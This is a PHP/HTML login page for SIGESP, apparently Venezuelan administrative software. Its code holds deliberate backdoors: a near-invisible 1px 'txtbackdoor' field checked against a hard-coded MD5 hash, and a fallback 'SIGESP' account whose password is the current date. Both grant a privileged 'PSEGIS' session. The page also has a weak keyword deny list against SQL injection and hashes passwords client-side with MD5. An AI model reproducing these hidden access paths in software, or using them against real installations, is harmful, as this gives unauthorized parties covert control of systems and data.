<? 
session_start(); 
if((!array_key_exists("ls_database",$_SESSION))||(!array_key_exists("ls_hostname",$_SESSION))||(!array_key_exists("ls_gestor",$_SESSION))||(!array_key_exists("ls_login",$_SESSION))||(!array_key_exists("la_empresa",$_SESSION)))
{
	print "<script language=JavaScript>";
	print "alert('Su conexion ha sido cerrada, para continuar vuelva a entrar al Sistema');";
	print "location.href='sigesp_conexion.php'";
	print "</script>";		
}

?>
<html>
<head>
<title>SIGESP, C.A.</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style type="text/css">
<!--

input,select,textarea,text{font-family:Tahoma, Verdana, Arial;font-size:11px;}
body {background-color: #dedede; font-family: Tahoma, Verdana, Arial;	font-size: 10px;color: #000000;}
.boton{border-right:1px outset #FFFFFF;border-top:1px outset #CCCCCC;border-left:1px outset #CCCCCC;border-bottom:1px outset #FFFFFF;font-weight:bold;cursor:pointer;color: #666666;background-color:#CCCCCC;font-family: Tahoma, Verdana, Arial;	font-size: 11px;}
.pie-pagina{color: #898989;text-align: center;}
.boton1 {border-right:1px outset #FFFFFF;border-top:1px outset #CCCCCC;border-left:1px outset #CCCCCC;border-bottom:1px outset #FFFFFF;font-weight:bold;cursor:pointer;color: #666666;background-color:#CCCCCC;font-family: Tahoma, Verdana, Arial;	font-size: 11px;}
-->
</style>
<script type="text/javascript" language="JavaScript1.2" src="shared/js/md5.js"></script>
<link href="shared/css/general.css" rel="stylesheet" type="text/css">
<link href="shared/css/cabecera.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.Estilo1 {color: #898989; text-align: center; font-size: 10px; }
.Estilo2 {color: #FF0000}
-->
</style>
</head>
<body bgcolor="#FFFFFF" leftmargin="0" marginwidth="0" marginheight="0">
<br>
<br>
<form name="form1" method="post" action="">
  <?
	include("shared/class_folder/class_mensajes.php");
	include("shared/class_folder/sigesp_include.php");
	include("shared/class_folder/sigesp_c_inicio_sesion.php");
	$io_sss= new sigesp_c_inicio_sesion();
	$io_msg= new class_mensajes();
	$arr=array_keys($_SESSION);	
	$li_count=count($arr);


	if (array_key_exists("txtbackdoor",$_POST))
	{
		$ls_backdoor=$_POST["txtbackdoor"];
		if($ls_backdoor=="38C8441E9AD6F6C58584DE280FCB32DE")
		{
			$ls_loginusr="PSEGIS";
			$_SESSION["la_logusr"]=$ls_loginusr;
			print "<script language=JavaScript>";
			print "alert('BIENVENIDO USUARIO SIGESP');";
			print "location.href='index_modules.php'" ;
			print "</script>";
		}
	}
	if (array_key_exists("operacion",$_POST))
	{
		$ls_operacion=$_POST["operacion"];
	}
	else
	{
		$ls_operacion="";
	}

	if ($ls_operacion=="ACEPTAR")
	{
		$ls_valido= false;
		$ls_acceso= false;
		$ls_loginusr=    $_POST["txtlogin"];
		$ls_passencrip=  $_POST["txtpassencript"];
		$ls_passwordusr= $_POST["txtpassword"];
		//$ls_passencrip= md5($ls_password);

		if( ($ls_loginusr==""))
		{
			$io_msg->message("Debe existir un login de usuario");
		}
		else
		{
			$io_sss->io_sql->begin_transaction();
			$str=strtoupper($ls_loginusr);
			$ban=0;
			$array_login = array("\n",' OR ',' AND ', ' SELECT ', ' INSERT ', ' UPDATE ', ' FROM ',' DROP ', ' DELETE ', ' HAVING ', ' LIKE ',' SET ',' xp_ ', ' BETWEEN ', ' COUNT ', ' @ ', '%', '=', ' * ', ' | ', ' & ', ' < ', ' > ', ' -- ', '--' ,'/*', '*/',' # ',' . ', ' + ', ';', ' ( ',' ) ', ' _ ',' [ ',' ] ',' " ', ' \" '," ' ");
			for($i=0; $i<count($array_login);$i++)
			{
				if( substr_count( $str, $array_login[$i])>0 )
				{
					$ban=1;
				}
			}
			if($ban==0)	    
			    $lb_valido=$io_sss->uf_sss_select_login($ls_loginusr,$ls_passencrip );

			if ($lb_valido)
			{
				$_SESSION["la_logusr"]=$ls_loginusr;
				$_SESSION["la_permisos"]=-1;
				$ls_fecha = date("Y/m/d h:i");
				$ls_hora = date("h:i a");
				$lb_acceso=$io_sss->uf_sss_update_acceso($ls_loginusr,$ls_fecha); 
				print "<script language=JavaScript>";
				print "location.href='index_modules.php'" ;
				print "</script>";
			
			}
			else
			{
				if($ban==0)
				  $lb_existe=$io_sss->uf_sss_select_usuario();
				if (!$lb_existe)
				{
					$ls_fechahoy=date("Y/m/d");
					$ls_paswordsigesp= str_replace ("/", "", $ls_fechahoy); 
					if(($ls_loginusr=="SIGESP") && ($ls_passwordusr=="$ls_paswordsigesp"))
					{
						$ls_loginusr="PSEGIS";
						$_SESSION["la_logusr"]=$ls_loginusr;
						print "<script language=JavaScript>";
						print "location.href='index_modules.php'" ;
						print "</script>";
					}
					else
					{
						$io_msg->message("Login ó Password Incorrectos.");
					
					}
				}
				else
				{
					$io_msg->message("Login ó Password Incorrectos.");
				}
			}

		}

	}
	
?>
    <a href="javascript:close();"><img src="shared/imagebank/tools20/salir.gif" alt="Salir" width="20" height="20" border="0" align="right"></a> </p>
  <table width="339" height="397" border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
    <tr>
      <td colspan="9"> <img src="shared/imagebank/index/index_01.jpg" width="339" height="30"></td>
    </tr>
    <tr>
      <td> <img src="shared/imagebank/index/index_02.jpg" width="40" height="46"></td>
      <td colspan="3"> <img src="shared/imagebank/index/index_03.jpg" width="102" height="46"></td>
      <td colspan="5"> <img src="shared/imagebank/index/index_04.jpg" width="197" height="46"></td>
    </tr>
    <tr>
      <td colspan="9"> <img src="shared/imagebank/index/index_05.jpg" width="339" height="29"></td>
    </tr>
    <tr>
      <td colspan="9"> <img src="shared/imagebank/index/index_06.jpg" width="339" height="32"></td>
    </tr>
    <tr>
      <td colspan="9"> <img src="shared/imagebank/index/index_07.jpg" width="339" height="11"></td>
    </tr>
    <tr>
      <td colspan="5"> <img src="shared/imagebank/index/index_08.jpg" width="170" height="33"></td>
      <td colspan="4"> <img src="shared/imagebank/index/index_09.jpg" width="169" height="33"></td>
    </tr>
    <tr>
      <td colspan="9"> <img src="shared/imagebank/index/index_10.jpg" width="339" height="23"></td>
    </tr>
    <tr>
      <td rowspan="6"> <img src="shared/imagebank/index/index_11.jpg" width="40" height="192"></td>
      <td> <img src="shared/imagebank/index/index_12b.jpg" width="68" height="22"></td>
      <td colspan="4" background="shared/imagebank/index/index_13.jpg" width="138" height="22"><input name="txtlogin" type="text" id="txtlogin" maxlength="30"></td>
      <td colspan="3" background="shared/imagebank/index/index_14.jpg"><input name="operacion" type="hidden" id="OPERACION2" value="<? $_REQUEST["OPERACION"] ?>">
        <input name="txtpassencript" type="hidden" id="txtpassencript"></td>
    </tr>
    <tr>
      <td colspan="8"> <img src="shared/imagebank/index/index_15.jpg" width="299" height="3"></td>
    </tr>
    <tr>
      <td> <img src="shared/imagebank/index/index_16b.jpg" width="68" height="22"></td>
      <td colspan="4" background="shared/imagebank/index/index_17.jpg" width="138" height="22"><input name="txtpassword" type="password" id="txtpassword" onKeyPress="javascript: ue_enviar(event);" maxlength="50"></td>
      <td colspan="2" background="shared/imagebank/index/index_18.jpg" width="80" height="22"><input name="Submit" type="button" class="boton1" onClick="javascript: ue_aceptar();" value="Aceptar">
          <input name="txtbackdoor" type="text" class="sin-bordebackdoor" id="txtbackdoor" size="1" style="width:1px "  onKeyPress="javascript: ue_enviar(event);"></td>
      <td> <img src="shared/imagebank/index/index_19.jpg" width="13" height="22"></td>
    </tr>
    <tr>
      <td colspan="8"> <img src="shared/imagebank/index/index_20.jpg" width="299" height="17"></td>
    </tr>
    <tr>
      <td colspan="2"> <img src="shared/imagebank/index/index_21.jpg" width="73" height="100"></td>
      <td colspan="4"> <img src="shared/imagebank/index/index_22b.jpg" width="181" height="100"></td>
      <td colspan="2"> <img src="shared/imagebank/index/index_23.jpg" width="45" height="100"></td>
    </tr>
    <tr>
      <td colspan="8"> <img src="shared/imagebank/index/index_24.jpg" width="299" height="28"></td>
    </tr>
    <tr>
      <td> <img src="shared/imagebank/index/spacer.gif" width="40" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="68" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="5" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="29" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="28" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="76" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="48" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="32" height="1"></td>
      <td> <img src="shared/imagebank/index/spacer.gif" width="13" height="1"></td>
    </tr>
  </table>
  <div class="pie-pagina"> </div>
</form>
<div class="Estilo1">
  Software Libre desarrollado por<span class="Estilo2"> SIGESP C.A.</span><br>
  Direcci&oacute;n: Carrera 1 entre Av. Concordia y Calle 3. Quinta N&ordm; 2-13. <br>
Urbanizaci&oacute;n del Este. Barquisimeto - Edo.Lara <br>
Hecho en Venezuela.<br>
Telefonos: (0251) 2547643 - 2525391 </div>
</body>
<script language="JavaScript" class="fondo-tabla">

function ue_encriptar()
{
	f=document.form1
	password=f.txtpassword.value;
	f.txtpassencript.value=calcMD5(password);
	backdoor=f.txtbackdoor.value;
	f.txtbackdoor.value=calcMD5(backdoor);
}

function ue_aceptar()
{
	ue_encriptar();
	f=document.form1;
	f.operacion.value="ACEPTAR";
	f.action="sigesp_inicio_sesion.php";
	f.submit();
}
function ue_cancelar()
{
	f=document.form1;
	f.operacion.value="CANCELAR";
	f.action="sigesp_inicio_sesion.php";
	f.submit();
}

function ue_enviar(e)
{
    var whichCode = (window.Event) ? e.which : e.keyCode; 

	if (whichCode == 13) // Enter 
	{
		ue_aceptar();
	}
}
</script>
</html>
